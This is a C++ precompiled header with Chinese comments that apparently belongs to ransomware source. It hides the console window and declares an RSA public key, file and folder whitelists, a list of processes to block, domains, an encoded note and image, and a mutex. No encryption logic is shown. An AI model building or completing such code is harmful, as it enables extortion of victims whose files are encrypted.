// pch.h: 这是预编译标头文件。
// 下方列出的文件仅编译一次，提高了将来生成的生成性能。
// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。
// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。
// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //隐藏cmd窗口

#ifndef PCH_H
#define PCH_H

// 添加要在此处预编译的标头
#include"CJsonObject.hpp"
#include"base64.h"
#include<iostream>
#include <winsock2.h>
#include<Windows.h>
#include<vector>
#include<string>
#include <stack>
#include<tlhelp32.h>
#include<assert.h>
using namespace std;

extern string Base64RsaPk;
extern vector<string> whiteFloder;
extern vector<string> whiteFiles;
extern vector<string> whiteExtension;
extern vector<string> blockProcess;
extern vector<string> domain;
extern string Base64nbody;
extern string nname;
extern string Base64image;
extern string Base64nbody;
extern string net;
extern int RsaE;

extern HANDLE hMutex;


void main_function();


#endif //PCH_H
